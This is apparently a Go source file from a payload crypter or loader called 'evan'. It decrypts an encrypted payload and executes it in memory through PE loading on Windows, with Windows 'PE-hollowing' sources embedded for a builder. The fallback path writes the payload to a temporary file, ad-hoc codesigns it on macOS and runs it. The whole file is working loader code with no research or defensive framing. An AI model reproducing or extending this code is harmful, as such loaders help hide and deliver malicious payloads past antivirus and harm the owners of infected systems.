package runner

import (
	"embed"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"evan/internal/crypto"
)

// WindowsSources embeds the Windows PE-hollowing source file(s) so the
// self-contained builder can include them in generated binaries.
//
//go:embed *_windows.go
var WindowsSources embed.FS

// RunEncrypted decrypts an encrypted payload on disk and executes it.
func RunEncrypted(encryptedPath, keyPath string, args []string) error {
	plain, err := crypto.DecryptFile(encryptedPath, keyPath)
	if err != nil {
		return err
	}
	return RunPlain(plain, args)
}

// RunPlain executes decrypted payload bytes, using in-memory PE loading on
// Windows when possible and falling back to a temporary file on disk.
func RunPlain(plain []byte, args []string) error {
	if runtime.GOOS == "windows" {
		err := runPEInMemory(plain)
		if err == nil {
			return nil
		}
		// Fallback if PE loading fails (e.g., 32-bit exe, or missing TLS)
		fmt.Fprintf(os.Stderr, "In-memory PE load failed: %v. Falling back to disk...\n", err)
	}

	h := 64
	if len(plain) < h {
		h = len(plain)
	}
	head := strings.TrimSpace(string(plain[:h]))
	isPython := strings.HasPrefix(head, "#!") ||
		strings.HasPrefix(head, "import ") ||
		strings.HasPrefix(head, "from ") ||
		strings.HasPrefix(head, "def ")

	suffix := "evan-*.bin"
	if runtime.GOOS == "windows" {
		suffix = "evan-*.exe"
	}
	if isPython {
		suffix = "evan-*.py"
	}
	tmp, err := os.CreateTemp("", suffix)
	if err != nil {
		return err
	}
	name := tmp.Name()
	defer os.Remove(name)

	if _, err := tmp.Write(plain); err != nil {
		tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}

	var c *exec.Cmd
	if isPython {
		c = exec.Command("python3", append([]string{name}, args...)...)
	} else {
		if err := os.Chmod(name, 0o700); err != nil {
			return err
		}
		if runtime.GOOS == "darwin" {
			_ = exec.Command("codesign", "--force", "--sign", "-", name).Run()
		}
		c = exec.Command(name, args...)
	}
	c.Stdout, c.Stderr, c.Stdin = os.Stdout, os.Stderr, os.Stdin
	return c.Run()
}
